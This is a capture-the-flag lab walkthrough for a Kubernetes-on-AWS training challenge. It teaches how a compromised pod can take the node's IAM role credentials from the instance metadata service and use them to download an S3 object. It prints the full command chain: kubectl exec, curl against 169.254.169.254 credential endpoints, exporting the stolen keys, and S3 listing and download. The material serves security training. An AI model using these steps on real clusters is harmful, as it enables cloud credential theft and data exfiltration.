# Shadowhawk Challenge

The *Shadowhawk* challenge requires you to find a flag located in the AWS Simple Storage Service (S3). Unfortunately, the *kubeace-maverick* IAM user does not have permissions to the AWS S3 API. Without direct access to S3, you will need to use the [AWS Instance Metadata Service IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html){: target="_blank" rel="noopener"} to escalate your AWS permissions and gain access to the flag.

## Pod Permission Inheritance

Cloud managed Kubernetes services (AWS EKS, Azure AKS, and Google's GKE) typically create Kubernetes node(s) using the cloud provider's virtual machine service. Each node usually needs cloud permissions to read private container images and create network interfaces, load balancers, and other network components for connecting Kubernetes ingress and service resources. These permissions can be granted to the cloud virtual machine using an AWS IAM Role, Azure Managed Identity, or Google Service account attached to the virtual machine. It is important to realize that pods running on the node also inherit these permissions.

Pods running on the node may also need access to cloud resources such as storage, secrets, and backend databases. These permissions are often granted to the node's service account, which means that any pod running on the node inherits all of these permissions.

Attackers gaining access to an EKS cluster will attempt to discover service account credentials using the [Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/){: target="_blank" rel="noopener"} attacker technique. By default, this technique can allow a pod running on the node to communicate with the node's instance metadata service (IMDS), retrieve temporary instance profile credentials, and potentially escalate permissions.

1. Using your Terminal, verify that *kubeace-maverick* IAM user does not have access to list the S3 buckets in the AWS account hosting the EKS cluster. What error message is returned?

    ??? tip "Hint"

        Run `aws s3api list-buckets` command to list the S3 buckets in the AWS account.

        ```bash
        aws s3api list-buckets
        ```

    ??? success "Answer"

        The list buckets command will return an unauthorized error because the *kubeace-maverick* IAM user does not have access to list the S3 buckets in the account.

        !!! abstract "Expected Output"
            ```
            An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
            ```

1. Given a scenario where the `ui` pod is compromised, an attacker can use the [Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/){: target="_blank" rel="noopener"} attacker technique to obtain temporary credentials from the node. Use the `kubectl exec` command to obtain a shell on the `ui` pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?

    ??? tip "Hint"

        - List the pods running in the `hth` namespace. Make a note of the *ui* pod's name, as you will need this in the next step.

            ```bash
            kubectl get pods -n hth
            ```

            !!! abstract "Expected Output"
                ```bash
                NAME            READY   STATUS    RESTARTS   AGE
                api-randomid    1/1     Running   0          2d21h
                ui-randomid     1/1     Running   0          2d21h
                ```

        - Use the `kubectl exec` command to obtain a shell on the `ui` pod.

            ```bash
            kubectl exec --stdin --tty -n hth ENTER_UI_POD_NAME -- /bin/bash
            ```


            !!! abstract "Expected Output"
                ```bash
                root@ui-randomid:/#
                ```

        - Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.

            ```bash
            curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo;
            ```

        - Use the role's name to view the role's temporary security credentials. Make a note of the **AccessKeyId**, **SecretAccessKey**, and **Token** values for the next step.

            ```bash
            curl http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/ && echo;
            ```

            !!! abstract "Expected Output"
                ```bash hl_lines="4-6"
                {
                  ...
                  "Type" : "AWS-HMAC",
                  "AccessKeyId" : "?????",
                  "SecretAccessKey" : "?????",
                  "Token" : "?????",
                  ...
                }
                ```

        - Run the following command to exit the shell and return to your local machine.

            ```bash
            exit
            ```

    ??? success "Answer"

        The AWS IAM Role attached to the Kubernetes node is **hth-node-role-randomid**. Which tells you that the command to obtain temporary credentials is...
            
        ```bash
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/
        ```

## Pod Privilege Escalation

With the Kubernetes node's temporary instance profile credentials in hand, use those credentials to exfiltrate the **Shadowhawk** flag from S3. Open a new Terminal on your machine and set the required [AWS CLI environment variables](https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-envvars.html){: target="_blank" rel="noopener"} to use the node's temporary credentials. Then, use the AWS CLI to find the flag.

1. Set the required AWS CLI environment variables to use the node's temporary credentials. What is the name of the S3 bucket that contains the `shadowhawk` flag.

    ??? tip "Hint"

        - Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the `NODE_ROLE_ACCESS_KEY_ID`, `NODE_ROLE_SECRET_ACCESS_KEY`, and `NODE_ROLE_SESSION_TOKEN` placeholders with the values obtained from the previous step.

            ```bash
            export AWS_ACCESS_KEY_ID=ENTER_NODE_ROLE_ACCESS_KEY_ID
            export AWS_SECRET_ACCESS_KEY=ENTER_NODE_ROLE_SECRET_ACCESS_KEY
            export AWS_SESSION_TOKEN=ENTER_NODE_ROLE_SESSION_TOKEN
            ```

        - Run the `aws sts get-caller-identity` command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.

            ```bash
            aws sts get-caller-identity
            ```

            !!! abstract "Expected Output"
                ```console
                {
                  "UserId": "AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d",
                  "Account": "123456789012",
                  "Arn": "arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d"
                }
                ```

        - List all of the S3 buckets in the account that contain the keyword **hth**. The output will show an audit logs bucket alongside an `hth` bucket containing the **shadowhawk** flag.

            ```bash
            aws s3api list-buckets | grep "hth"
            ```

            !!! abstract "Expected Output"
                ```console hl_lines="2"
                "Name": "hth-audit-logs-randomid",
                "Name": "?????",
                ```

    ??? success "Answer"

        The S3 bucket that contains the `shadowhawk` flag is **hth-randomid**.

        !!! abstract "Expected Output"
            ```console
            "Name": "hth-randomid",
            ```

1. List the objects in the S3 bucket and exfiltrate the object that contains the `shadowhawk` flag.

    ??? tip "Hint"

        - Use the `aws s3api list-objects` command to list the objects in the S3 bucket. The output will show the object that contains the flag.

            ```bash
            aws s3api list-objects --bucket ????? | jq '.Contents[].Key'
            ```

            !!! abstract "Expected Output"
                ```hl_lines="3"
                "flightplans/cascadia-explorer.txt"
                "flightplans/ny-la-express.txt"
                "?????/?????"
                "flightplans/thames-to-seine.txt"
                "pilots/pilots.csv"
                ```

        - Use the `aws s3api get-object` command to copy the object that contains the flag to your local file system.

            ```bash
            aws s3api get-object --bucket ????? --key ????? /path/to/your/downloads/?????.txt
            ```

            !!! abstract "Expected Output"
                ```console
                {
                  "AcceptRanges": "bytes",
                  "LastModified": "2024-10-30T18:00:03+00:00",
                  "ContentLength": 1124,
                  "ETag": "\"77f6f010d81c99754efa3acc70d4b35d\"",
                  "ContentType": "application/octet-stream",
                  "ServerSideEncryption": "AES256",
                  "Metadata": {},
                  "TagCount": 3
                }
                ```

        - Open the file to find the `shadowhawk` flag.

    ??? success "Answer"

        - The command to download the object that contains the `shadowhawk` flag is...

            ```bash
            aws s3api get-object --bucket hth-randomid --key flightplans/shadowhawk.txt ~/Downloads/shadowhawk.txt
            ```

        - Open the file and find the *Startup Code* line, which contains the flag.

            !!! abstract "Expected Output"
                
                ```
                Startup Code: hth{?????}
                ```

## Next Challenge

Congratulations! You have identified a privilege escalation opportunity using the [Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/){: target="_blank" rel="noopener"} attacker technique and exfiltrated the **Shadowhawk** flag from the compromised AWS account.

Before you move on to the next challenge, make sure you clear the environment variables that are using the node's temporary credentials. This can be done by closing your Terminal or running the following *unset* command.

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

Continue to the [API Key Challenge](./api-key.md) to learn how Kubernetes secrets are attached to a pod.
